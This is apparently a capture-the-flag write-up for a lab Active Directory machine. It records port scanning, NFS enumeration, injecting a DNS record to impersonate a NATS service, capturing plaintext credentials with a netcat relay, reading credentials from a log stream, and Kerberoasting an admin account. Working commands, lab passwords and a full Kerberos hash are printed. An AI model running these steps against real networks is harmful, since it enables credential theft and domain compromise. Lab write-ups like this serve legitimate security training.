# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.232.163 --generate-hosts-file /etc/hosts     

SMB         10.129.232.163  445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

# Setting up kerberos realm
```python
❯❯❯ sudo nxc smb 10.129.232.163 --generate-krb5-file /etc/krb5.conf 
SMB         10.129.232.163  445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.163  445    dc01             [+] krb5 conf saved to: /etc/krb5.conf
SMB         10.129.232.163  445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
```

Since NTLM is disabled, ill be interacting with kerberos so ill set this now

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.232.163 -vv

Nmap scan report for 10.129.232.163
Host is up, received user-set (0.013s latency).
Scanned at 2026-10-10 16:04:09 BST for 11s
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
111/tcp   open  rpcbind          syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2049/tcp  open  nfs              syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
4222/tcp  open  vrml-multi-use   syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
51462/tcp open  unknown          syn-ack
51463/tcp open  unknown          syn-ack
51478/tcp open  unknown          syn-ack
51484/tcp open  unknown          syn-ack
51508/tcp open  unknown          syn-ack
58086/tcp open  unknown          syn-ack
62970/tcp open  unknown          syn-ack
```

## Nmap
```python
❯❯❯ nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985 -A --min-rate=2000 -sT -Pn dc01.mirage.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 16:08 +0100
Nmap scan report for dc01.mirage.htb (10.129.232.163)
Host is up (0.013s latency).

PORT     STATE SERVICE         VERSION
53/tcp   open  domain          Simple DNS Plus
88/tcp   open  kerberos-sec    Microsoft Windows Kerberos (server time: 2026-10-10 22:08:49Z)
111/tcp  open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc           Microsoft Windows RPC
139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp open  nlockmgr        1-4 (RPC #100021)
3268/tcp open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
3269/tcp open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
4222/tcp open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","server_name":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":17,"client_ip":"10.10.14.61","xkey":"XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","server_name":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":18,"client_ip":"10.10.14.61","xkey":"XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","server_name":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":19,"client_ip":"10.10.14.61","xkey":"XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","server_name":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":16,"client_ip":"10.10.14.61","xkey":"XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6"} 
|_    -ERR 'Authentication Timeout'
5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (96%), Microsoft Windows Server 2016 (96%), Microsoft Windows 11 24H2 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows 11 24H2 - 25H2 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# System time
```python
❯❯❯ ntpdate dc01.mirage.htb                    
2026-10-10 23:11:35.843886 (+0100) +25199.759920 +/- 0.006475 dc01.mirage.htb 10.129.232.163 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

So the DC is running at +7h

# SMB (445)

Null auth not really possible when only kerberos is enabled

Guest account is also disabled

# NFS (2049)

Looks like root escape is not possible here

```python
❯❯❯ nxc nfs dc01.mirage.htb --shares
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Enumerating NFS Shares
NFS         10.129.232.163  2049   dc01.mirage.htb  UID        Perms    Storage Usage    Share                          Access List    
NFS         10.129.232.163  2049   dc01.mirage.htb  ---        -----    -------------    -----                          -----------    
NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 r--      16.3GB/19.8GB    /MirageReports
```

```python
❯❯❯ nxc nfs dc01.mirage.htb --share '/MirageReports' --ls '/'
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.232.163  2049   dc01.mirage.htb  UID        Perms  File Size     File Path
NFS         10.129.232.163  2049   dc01.mirage.htb  ---        -----  ---------     ---------
NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/.
NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/..
NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf
```

Looks like some pdf files in the NFS share

```python
❯❯❯ nxc nfs dc01.mirage.htb --share '/MirageReports' --get-file Incident_Report_Missing_DNS_Record_nats-svc.pdf Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Downloading Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf
NFS         10.129.232.163  2049   dc01.mirage.htb  File successfully downloaded from Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf

❯❯❯ nxc nfs dc01.mirage.htb --share '/MirageReports' --get-file Mirage_Authentication_Hardening_Report.pdf Mirage_Authentication_Hardening_Report.pdf
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Downloading Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf
NFS         10.129.232.163  2049   dc01.mirage.htb  File successfully downloaded from Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf
```

Ill download both of these files and have a look

```python
❯❯❯ nxc nfs dc01.mirage.htb --share '/MirageReports' --put-file test.txt test.txt 
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Uploading from test.txt to test.txt
NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Trying to create test.txt
NFS         10.129.232.163  2049   dc01.mirage.htb  [-] Error writing file to share test.txt: NFS3ERR_ROFS
```

I dont have the ability to write to the share

![](Pasted%20image%2020261010162407.png)

There is a report of a missing DNS record for the NATS service, which is running on port 4222

![658](Pasted%20image%2020261010162706.png)

Image above could be helpful for when and if i need to interact with NATS

Also a user `dev_account_a`

![639](Pasted%20image%2020261010162844.png)

![613](Pasted%20image%2020261010162915.png)

Some more potentially helpful info

![](Pasted%20image%2020261010163227.png)

The other report shows a potential user, but other than that basically just explains the disabling of NTLM, however its mentioned it was a gradual process, some systems may still allow NTLM

# NATS (4222)

```python
❯❯❯ echo | nc dc01.mirage.htb 4222 
INFO {"server_id":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","server_name":"NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":80,"client_ip":"10.10.14.61","xkey":"XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6"} 
-ERR 'Authorization Violation'
```

Looks like there is an authorization error

Also looks like its giving me the version `2.11.3`, and also a reference to a git commit

https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation

This attack could be possible, but for the moment i dont have credentials to add a DNS record yet

Just like the pdf file said, the record does not exist in DNS for the service

Ill use what hacktricks says and ill install the client

```python
❯❯❯ ~/go/bin/nats context save dc01.mirage.htb --server='nats://dc01.mirage.htb:4222'
NATS Configuration Context "dc01.mirage.htb"

  Server URLs: nats://dc01.mirage.htb:4222
         Path: /home/kali/.config/nats/context/dc01.mirage.htb.json
```

I first have to define the context of the system, this is almost like an environment variable in bash

# Credential capture via DNS/service impersonation

```python
❯❯❯ nsupdate                                                                    
> server 10.129.232.163
> update add nats-svc.mirage.htb 60 A 10.10.14.61
> send
> 
```

Ill add a DNS record for my IP

```python
❯❯❯ nc dc01.mirage.htb 4222 | head -1 | nc -lnvp 4222                           
listening on [any] 4222 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.232.163] 51057
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}
PING
```

I have now captured plaintext credentials

All this can be found in hacktricks:

https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation

These creds dont work on the domain, but they could be for the NATS service

```python
❯❯❯ ~/go/bin/nats context add mirage -s nats://dc01.mirage.htb --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
NATS Configuration Context "mirage"

  Server URLs: nats://dc01.mirage.htb
     Username: Dev_Account_A
     Password: ******************
         Path: /home/kali/.config/nats/context/mirage.json
```

I can add these to the client 

# NATS enumeration to find logged credentials

So with the new creds i can auth to the service and start enumerating it

```python
❯❯❯ ~/go/bin/nats account info --context mirage 
Account Information

                           User: Dev_Account_A
                        Account: dev
                        Expires: never
                      Client ID: 189
                      Client IP: 10.10.14.61
                            RTT: 13ms
              Headers Supported: true
                Maximum Payload: 1.0 MiB
                  Connected URL: nats://dc01.mirage.htb:4222
              Connected Address: 10.129.232.163:4222
            Connected Server ID: NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV
       Connected Server Version: 2.11.3
                 TLS Connection: no

JetStream Account Information:

Account Usage:

                        Storage: 570 B
                         Memory: 0 B
                        Streams: 1
                      Consumers: 0

Account Limits:

            Max Message Payload: 1.0 MiB

  Tier: Default:

      Configuration Requirements:

        Stream Requires Max Bytes Set: false
         Consumer Maximum Ack Pending: Unlimited

      Stream Resource Usage Limits:

                               Memory: 0 B of Unlimited 
                    Memory Per Stream: Unlimited
                              Storage: 570 B of Unlimited (1.0 MiB reserved)
                   Storage Per Stream: Unlimited
                              Streams: 1 of Unlimited
                            Consumers: Unlimited
```

This is just general account and service info

```python
❯❯❯ ~/go/bin/nats stream list --context mirage 
╭───────────────────────────────────────────────────────────────────────────────────╮
│                                      Streams                                      │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬────────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message   │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼────────────────┤
│ auth_logs │             │ 2025-05-05 08:18:19 │ 5        │ 570 B │ 1y158d16h30m0s │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴────────────────╯
```

There is a previous stream which i should be able to read

```python
❯❯❯ ~/go/bin/nats stream view auth_logs --context mirage
[1] Subject: logs.auth Received: 2025-05-05 08:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[2] Subject: logs.auth Received: 2025-05-05 08:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[3] Subject: logs.auth Received: 2025-05-05 08:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[4] Subject: logs.auth Received: 2025-05-05 08:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[5] Subject: logs.auth Received: 2025-05-05 08:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


17:50:57 Reached apparent end of data
```

I have found more credentials

```python
david.jjackson:pN8kQmn6b86!1234@
```

Ill try these on the domain

# Initial access on the domain

```python
 ❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

The credentials get me access on the domain

# Kerberoasting leads to user compromise

```python
❯❯❯ faketime -f +7h nxc ldap dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --kerberoasting kerb.hash
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
LDAP        dc01.mirage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.mirage.htb 389    DC01             [*] Total of records returned 1
LDAP        dc01.mirage.htb 389    DC01             [*] sAMAccountName: nathan.aadam, memberOf: ['CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb', 'CN=IT_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb'], pwdLastSet: 2025-06-23 22:18:18.584667, lastLogon: 2025-07-04 21:01:43.511763
LDAP        dc01.mirage.htb 389    DC01             $krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb\nathan.aadam*$b02d96bed6193309f86ae7a663257266$1411cb7dc46e14929866270df6bc2a99dd3bd1f09ee4d8a48a63eb5dab3060163f289f66742eedf5d42ea7dbf1a83b2ebeff02319da421d8636f852c4527c1f6978758009560011503348e8053537e0319de8ec1156d03ea438dce9a817993bc094cf0d6185f4ee5910b3ca24da3c69f7008557641a63657a685d5f634522a26d54150a21eedca0c52e44bfbe7972b551eadb19d8b19c417914cdad2e76ee8801c04befe4f5aff5745fcbab3a9dc04f1fa6b797dd70c790d92c29f2d53858ef29dd5d1011021ee99037e4993c569217eee1721a49ee3dce19d494efed872f1dee8fbea8fe3a3f3d94d288120269b44675dca6a36776d5dcd4193fb6f9fad85ec12690331daf9d711bafaf0aeaf00d6ae89509794baf517971815ea4de2f4c17c2067866eefeb0f8117005d51159d6e9a900af327aa93313a1322b1848281764ee523be5157cf844e46fcd7d847ec04308bfabce84121f280f5cc2f0f4b70d47fe9b09501e2e0a4ead7571fd5c76bb9acd8acb981eca50fa5cd4d6b3a6137aa159c9fcd3ac9cccdfd3ce4d158fe3a2dc1dac690e0bf34fe8f7ad1f46f9601f55c0701c5574a46aecfd91c0bba1be2d2e8c2de9509853cb5e630ba8375a8dfde8b94fd629e40e31731a4b5b642ae5d8173ecbece64d0d87ba7bde1939b6798b1773bd37795f3ae4e13708e1987a1cc72d1b1b8397e34a8e5041bf3b49b3e702ee0a87eba54f4dfd4672d6b0f64faa9a1aa6f744100a333a7659ed7be651b93d71b952c8794897849d5540edfc635722901666d904987d41533866e985304bf89cca3fef70625266ab99de05b57d7ca46b6b2fe023fa29ebcb255cb85055f82a80f97db617d71d9e84dcacf8befdcaae90495c7529e14a0a253d465399bc9a5e9aa3fdd3ceec4f9db0ed8321a00c6ba12af0c8d90848ccf761437b545b49f307c54cb8e5c1d5b6e2c02e355949b85a259b5e8c4f61f11e81aaf55803f18b88f3a64e69af59d416546bae5889eef897ba1f46364c556534fbeb910ba1d51cd5c36c7dbc4aee03f279348c84b74814f4d50d85b020c60d2847dd903dad2ad32fcdb43e7a6ce8bf665554184d6e335606114b23111ef77be658eeb260fc4e5eaa271831e839818b84e871d6ecc52f78f224f14e82e5aa4baf85e896702cf6e3f7fb5a888b7ac083e90d3ca4b9977aa366db4f528120969d5205b682a5a5a1ac90a868c05efffd7cd87427024c578d3028ae52faec66f70d409198fe4f72f9953d863ce9140d4f655791d1a14da599244a51e910ab6f5a9ca8993e88b5778b43866c9be35116a45c689f47504895be6b2ca87c0f2ada1b96b1a4fa360bbca46811578fff890081e630e23f66bda37a3849677676ea76d629e2bbc131d88a0885d1090c3b60790d4ba5e9b2bd2e69254240f1c489e5f8f2c19794c9d2e2b698ee800c3c6218ac844d3c8a9f5d13942f34f76f110191800660a6f0de7b1b79ae846e3f8b5a53576d7457021e86864dc8049f3239fdfc73cb3c17fa194e7f2ea0013ed07a3187e2920bfa3904235691e4e6abe75f6658887a323c936ab5257534ecec6db5cc9d72207fe0df8201d
```







